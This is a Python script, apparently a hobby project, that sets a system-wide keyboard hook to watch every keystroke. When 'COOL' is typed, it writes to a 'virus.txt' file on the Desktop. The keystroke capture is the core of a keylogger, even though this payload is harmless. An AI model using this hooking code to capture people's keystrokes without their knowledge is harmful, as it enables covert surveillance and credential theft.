import sys, logging, pyHook, pythoncom, playsound, os

#the list which stores key presses. For simplicity, it only cares about the 4 most recent presses
keyLog = [0, 0, 0, 0]

def payloadSound():
	playsound('cool.wav')

def payloadFile(fileName):
	path = os.path.expanduser('~/Desktop')
	filePath = os.path.join(path,fileName)
	print("File Path:",filePath)
	f = open(filePath,"a+")
	print("File opened")
	f.write("cool\n")
	f.close()
	print("Done")		
	
payloadFile("virus.txt")


def keyboardEvent(event):
	#this converts the key press into an ASCII character, so only ASCII gets put into our list
	press = chr(event.Ascii)

	#storage of the recent presses in the keyLog list for logic to activate payloads
	keyLog.pop(0)
	keyLog.append(press)

	#the logic that activates a payload
	if keyLog[0] == "C" and keyLog[1] == "O" and keyLog[2] == "O" and keyLog[3] == "L":
		#payload goes here
		print("cool")

		#this code doesn't have an audio file yet
		'''payloadSound()'''

		payloadFile("virus.txt")



	#these two lines are so you can see what the keylogger is doing on the command prompt
	print(press)
	print(keyLog)

	#returning True means the function doesn't try and stick around: it goes to the next key press
	return True

#pyHook and pythoncom functions that catches when the user does something, for us, a keyboard press
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = keyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
